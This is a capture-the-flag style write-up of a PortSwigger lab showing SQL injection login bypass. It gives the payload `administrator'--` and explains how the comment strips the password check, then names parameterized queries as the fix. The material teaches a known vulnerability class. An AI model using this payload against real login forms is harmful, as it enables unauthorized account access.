# Lab 02 — SQL injection vulnerability allowing login bypass

> **Apprentice** · [Official lab](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

**Entry point:** login form (`POST /login`, `username` / `password` fields)

## Goal

Log in as the `administrator` user without knowing the password.

## Background

The login check queries:

```sql
SELECT * FROM users WHERE username = '<INPUT>' AND password = '<INPUT>'
```

## Solution

1. Go to the login page.
2. In the **Username** field enter:

```
administrator'--
```

3. Type anything (or nothing meaningful) in the **Password** field and submit.

Resulting SQL:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = '...'
```

The `--` comments out the password check, so the query returns the
`administrator` row as long as the username exists.

4. You are logged in as `administrator` — lab solved.

## Notes

This works because the comment removes the password condition entirely —
a classic authentication bypass. Parameterized queries prevent it.
